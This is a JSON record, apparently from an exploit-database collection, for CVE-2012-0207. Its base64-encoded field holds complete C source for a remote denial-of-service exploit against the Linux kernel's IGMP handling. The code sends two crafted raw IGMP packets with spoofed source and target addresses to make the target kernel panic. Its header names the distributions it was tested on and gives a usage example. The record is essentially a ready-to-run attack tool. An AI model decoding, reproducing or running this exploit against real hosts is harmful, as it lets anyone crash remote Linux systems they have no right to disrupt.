{
    "source": "exploit-database", 
    "exploit": "LyoNCioqIGxpbnV4LXVuZGVhZGF0dGFjay5jDQoqKiBMaW51eCBJR01QIFJlbW90ZSBEZW5pYWwgT2YgU2VydmljZSAoSW50cm9kdWNlZCBpbiBsaW51eC0yLjYuMzYpDQoqKiBDVkUtMjAxMi0wMjA3DQoqKiBjcmVkaXRzIHRvIEJlbiBIdXRjaGluZ3M6DQoqKiBodHRwOi8vd29tYmxlLmRlY2FkZW50Lm9yZy51ay9ibG9nL2lnbXAtZGVuaWFsLW9mLXNlcnZpY2UtaW4tbGludXgtY3ZlLTIwMTItMDIwNy5odG1sDQoqKiB3cml0dGVuIEJ5IEtpbmdjb3BlDQoqKiBZZWFyIDIwMTINCioqIFJpcHBlZCAmIG1vZGlmaWVkIGNvZGUgd3JpdHRlbiBieSBGaXJlc3Rvcm0NCioqIFRlc3RlZCBhZ2FpbnN0ICogT3BlblN1U0UgMTEuNCBzeXN0ZW0NCioqCQkgICogUmVjZW50IFVidW50dSBEaXN0cm8NCioqDQoqKiBFeGFtcGxlOg0KKiogLi91bmRlYWRhdHRhY2sgMTkyLjE2OC4yLjE2IDE5Mi4xNjguMi4zDQoqKiBUaGUgTGludXggS2VybmVsIGF0IHRoZSByZW1vdGUgc2lkZSB3aWxsIFBhbmljDQoqKiB3aGVuIHNlbnQgb3ZlciB0aGUgbmV0d29yayA6Pg0KKiogRU5KT1khDQoqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzeXMvdGltZS5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KDQpzdHJ1Y3QgaXBoZHINCnsNCiAgdW5zaWduZWQgY2hhciBpaGw6NCwgdmVyc2lvbjo0LCB0b3M7DQogIHVuc2lnbmVkIHNob3J0IHRvdF9sZW4sIGlkLCBmcmFnX29mZjsNCiAgdW5zaWduZWQgY2hhciB0dGwsIHByb3RvY29sOw0KICB1bnNpZ25lZCBzaG9ydCBjaGVjazsNCiAgdW5zaWduZWQgaW50IHNhZGRyLCBkYWRkcjsNCiAgdW5zaWduZWQgaW50IG9wdGlvbnMxOw0KICB1bnNpZ25lZCBpbnQgb3B0aW9uczI7DQp9Ow0KDQoNCnN0cnVjdCBpZ21wX3F1ZXJ5IHsNCiAgICAgICAgdW5zaWduZWQgY2hhciB0eXBlOw0KICAgICAgICB1bnNpZ25lZCBjaGFyIG1heHJlc3BvbnNlOw0KICAgICAgICB1bnNpZ25lZCBzaG9ydCBjc3VtOw0KICAgICAgICB1bnNpZ25lZCBpbnQgbWNhc3Q7DQogICAgICAgIGNoYXIgcGFkZGluZ1s0MF07DQp9Ow0KDQoNCnVuc2lnbmVkIHNob3J0IGluX2Noa3N1bSh1bnNpZ25lZCBzaG9ydCAqLCBpbnQpOw0KbG9uZyByZXNvbHZlKGNoYXIgKik7DQoNCg0KbG9uZyByZXNvbHZlKGNoYXIgKmhvc3QpDQp7DQogIHN0cnVjdCBob3N0ZW50ICpoc3Q7DQogIGxvbmcgYWRkcjsNCg0KDQogIGhzdCA9IGdldGhvc3RieW5hbWUoaG9zdCk7DQogIGlmIChoc3QgPT0gTlVMTCkNCiAgICByZXR1cm4oLTEpOw0KDQoNCiAgbWVtY3B5KCZhZGRyLCBoc3QtPmhfYWRkciwgaHN0LT5oX2xlbmd0aCk7DQoNCg0KICByZXR1cm4oYWRkcik7DQp9DQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkNCnsNCiAgc3RydWN0IHNvY2thZGRyX2luIGRzdDsNCiAgc3RydWN0IGlwaGRyICppcDsNCiAgc3RydWN0IGlnbXBfcXVlcnkgKmlnbXA7DQogIGxvbmcgZGFkZHIsIHNhZGRyOw0KICBpbnQgcywgaT0wLCBjLCBsZW4sIG9uZT0xOw0KICBjaGFyIGJ1ZlsxNTAwXTsNCg0KDQogIGlmIChhcmdjIDwgMykNCiAgew0KICAgIHByaW50ZigiTGludXggSUdNUCBSZW1vdGUgRGVuaWFsIE9mIFNlcnZpY2UgKEludHJvZHVjZWQgaW4gbGludXgtMi42LjM2KVxuIg0KCSAgICJjcmVkaXRzIHRvIEJlbiBIdXRjaGluZ3NcbndyaXR0ZW4gYnkgS2luZ2NvcGVcbiINCgkgICAiUmlwcGVkICYgbW9kaWZpZWQgY29kZSB3cml0dGVuIGJ5IEZpcmVzdG9ybVxuIik7DQogICAgcHJpbnRmKCJVc2FnZTogJXMgPHNyYz4gPGRzdD5cbiIsICphcmd2KTsNCiAgICByZXR1cm4oMSk7DQogIH0NCg0KDQogIGRhZGRyID0gcmVzb2x2ZShhcmd2WzJdKTsNCiAgc2FkZHIgPSByZXNvbHZlKGFyZ3ZbMV0pOw0KDQogIG1lbXNldChidWYsIDAsIDE1MDApOw0KICBpcCA9IChzdHJ1Y3QgaXBoZHIgKikmYnVmOw0KICBpZ21wID0gKHN0cnVjdCBpZ21wX3F1ZXJ5KikmYnVmW3NpemVvZihzdHJ1Y3QgaXBoZHIpXTsNCg0KICBkc3Quc2luX2FkZHIuc19hZGRyID0gZGFkZHI7DQogIGRzdC5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCg0KICBpcC0+aWhsID0gNzsNCiAgaXAtPnZlcnNpb24gPSA0Ow0KICBpcC0+dG9zID0gMDsNCiAgaXAtPnRvdF9sZW4gPSBodG9ucyhzaXplb2Yoc3RydWN0IGlwaGRyKSs4KTsNCiAgaXAtPmlkID0gaHRvbnMoMTgyNzcpOw0KICBpcC0+ZnJhZ19vZmY9MDsNCiAgaXAtPnR0bCA9IDE7DQogIGlwLT5wcm90b2NvbCA9IElQUFJPVE9fSUdNUDsNCiAgaXAtPmNoZWNrID0gaW5fY2hrc3VtKCh1bnNpZ25lZCBzaG9ydCAqKWlwLCBzaXplb2Yoc3RydWN0IGlwaGRyKSk7DQogIGlwLT5zYWRkciA9IHNhZGRyOw0KICBpcC0+ZGFkZHIgPSBkYWRkcjsNCiAgaXAtPm9wdGlvbnMxID0gMDsNCiAgaXAtPm9wdGlvbnMyID0gMDsNCiAgaWdtcC0+dHlwZSA9IDB4MTE7DQogIGlnbXAtPm1heHJlc3BvbnNlID0gMHhmZjsNCiAgaWdtcC0+bWNhc3Q9aW5ldF9hZGRyKCIyMjQuMC4wLjEiKTsNCg0KICBpZ21wLT5jc3VtID0gMDsgLy9Gb3IgY29tcHV0aW5nIHRoZSBjaGVja3N1bSwgdGhlIENoZWNrc3VtIGZpZWxkIGlzIHNldCB0byB6ZXJvLg0KICBpZ21wLT5jc3VtPWluX2Noa3N1bSgodW5zaWduZWQgc2hvcnQgKilpZ21wLCA4KTsNCg0KICBzID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX1JBVyk7DQogIGlmIChzID09IC0xKQ0KICAgIHJldHVybigxKTsNCg0KICBwcmludGYoIlNlbmRpbmcgSUdNUCBwYWNrZXQ6ICVzIC0+ICVzXG4iLCBhcmd2WzFdLCBhcmd2WzJdKTsNCg0KICAgICAgaWYgKHNlbmR0byhzLCZidWYsc2l6ZW9mKHN0cnVjdCBpcGhkcikrOCwwLChzdHJ1Y3Qgc29ja2FkZHIgKikmZHN0LHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pKSA9PSAtMSkNCiAgICAgIHsNCiAgICAgICAgcGVycm9yKCJFcnJvciBzZW5kaW5nIHBhY2tldCIpOw0KICAgICAgICBleGl0KC0xKTsNCiAgICAgIH0NCg0KICBjbG9zZShzKTsNCg0KICBzID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX1JBVyk7DQogIGlmIChzID09IC0xKQ0KICAgIHJldHVybigxKTsNCg0KICBpcC0+aWQgPSBodG9ucygxODI3OCk7DQogIGlwLT50b3RfbGVuID0gc2l6ZW9mKHN0cnVjdCBpcGhkcikrMTI7DQogIGlnbXAtPnR5cGUgPSAweDExOw0KICBpZ21wLT5tYXhyZXNwb25zZSA9IDA7DQogIGlnbXAtPm1jYXN0PWluZXRfYWRkcigiMC4wLjAuMCIpOw0KDQogIGlnbXAtPmNzdW0gPSAwOyAvL0ZvciBjb21wdXRpbmcgdGhlIGNoZWNrc3VtLCB0aGUgQ2hlY2tzdW0gZmllbGQgaXMgc2V0IHRvIHplcm8uDQogIGlnbXAtPmNzdW09aW5fY2hrc3VtKCh1bnNpZ25lZCBzaG9ydCAqKWlnbXAsIDEyKTsNCg0KICBwcmludGYoIlNlbmRpbmcgSUdNUCBwYWNrZXQ6ICVzIC0+ICVzXG4iLCBhcmd2WzFdLCBhcmd2WzJdKTsNCg0KICAgICAgaWYgKHNlbmR0byhzLCZidWYsc2l6ZW9mKHN0cnVjdCBpcGhkcikrMTIsMCwoc3RydWN0IHNvY2thZGRyICopJmRzdCxzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSkgPT0gLTEpDQogICAgICB7DQogICAgICAgIHBlcnJvcigiRXJyb3Igc2VuZGluZyBwYWNrZXQiKTsNCiAgICAgICAgZXhpdCgtMSk7DQogICAgICB9DQoNCiAgcmV0dXJuKDApOw0KfQ0KDQoNCnVuc2lnbmVkIHNob3J0IGluX2Noa3N1bSh1bnNpZ25lZCBzaG9ydCAqYWRkciwgaW50IGxlbikNCnsNCiAgIHJlZ2lzdGVyIGludCBubGVmdCA9IGxlbjsNCiAgIHJlZ2lzdGVyIGludCBzdW0gPSAwOw0KICAgdV9zaG9ydCBhbnN3ZXIgPSAwOw0KDQogICB3aGlsZSAobmxlZnQgPiAxKSB7DQogICAgICBzdW0gKz0gKmFkZHIrKzsNCiAgICAgIG5sZWZ0IC09IDI7DQogICB9DQoNCg0KICAgaWYgKG5sZWZ0ID09IDEpIHsNCiAgICAgICoodV9jaGFyICopKCZhbnN3ZXIpID0gKih1X2NoYXIgKilhZGRyOw0KICAgICAgc3VtICs9IGFuc3dlcjsNCiAgIH0NCg0KDQogICBzdW0gPSAoc3VtID4+IDE2KSArIChzdW0gJiAweGZmZmYpOw0KICAgc3VtICs9IChzdW0gPj4gMTYpOw0KICAgYW5zd2VyID0gfnN1bTsNCiAgIHJldHVybihhbnN3ZXIpOw0KfQ==", 
    "filename": "platforms/linux/dos/18378.c", 
    "id": "18378", 
    "cves": [
        "CVE-2012-0207"
    ]
}